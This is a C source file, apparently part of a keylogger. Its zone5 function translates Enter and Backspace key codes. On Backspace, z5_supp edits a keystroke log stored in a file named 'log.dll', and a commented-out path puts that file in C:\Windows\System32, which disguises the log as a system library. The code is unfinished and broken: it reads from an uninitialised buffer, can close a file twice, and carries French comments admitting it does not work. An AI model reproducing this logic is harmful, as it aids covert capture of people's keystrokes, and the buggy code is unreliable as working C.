#include "zones.h"

short zone5(int key_value, keyboard_struct kb_status)
{
	if (key_value == 13)
		return ('\n');
	else if (key_value == 8)
		return (z5_supp(key_value)); // 215  
	else
		return (0);
}

int z5_supp(int key_value)
{
	FILE *fichier;
	wchar_t *line;
	wchar_t *read;
	int i;
	int end;
	int test;

	test = 0;
	i = 0;
	end = 0;
	line = (wchar_t *)malloc(sizeof(wchar_t) * 400);
	read = (wchar_t *)malloc(sizeof(wchar_t) * 1);
	//fichier = fopen("C:\\Windows\\System32\\log.dll", "r");
	fichier = fopen("log.dll", "r+");
	if (fichier)
	{
		while (fgetws(line, 400, fichier) != NULL)// ne marche toujours pas
			printf(" %c ||| %d\n", line[2], test++);  // read = z5_str_add(read, line);
		// grosse intrigue... line[2] existe alors qu'en %s elle s'arrete. 
		// faire une fonction de test (put_str)
		while (read[end])
			end++;
		if (end > 3)
		{
			end--; // car il y a un end en trop a cause de la boucle
			if (read[end - 1] != '\n' && read[end - 2] != '-') 
			{
				i = end - 1;
				while (read[i] != '#' && read[i - 1] != '#' && read[i - 2] != '\n')
					i--;
				i++;
				if (read[i] != '#' && read[i - 1] != '#' && read[i - 2] != '\n')
				{
					read[end - 1] = 0;
					//fclose(fichier);
					//fichier = fopen("log.dll", "w+");
					fputws(read, fichier);
					fclose(fichier);
					return (0);
				}
			}
		}
	}
	free(read);
	free(line);
	fclose(fichier);
	return (215);
}

wchar_t *z5_str_add(wchar_t *src, wchar_t *str)
{
	int i1;
	int i2;

	i1 = 0;
	i2 = 0;
	while (str[i1])
		i1++;
//	printf("%s", str);
	while (src[i2])
		i2++;
	src = (wchar_t *)realloc(src, sizeof(wchar_t) * (i1 + i2 + 1));
	i1 = 0;
	src[i2++] = '\n';
	while (str[i1])
	{
		src[i2 + i1] = str[i1];
		i1++;
	}
	src[i2 + i1] = 0;
	return (src);
}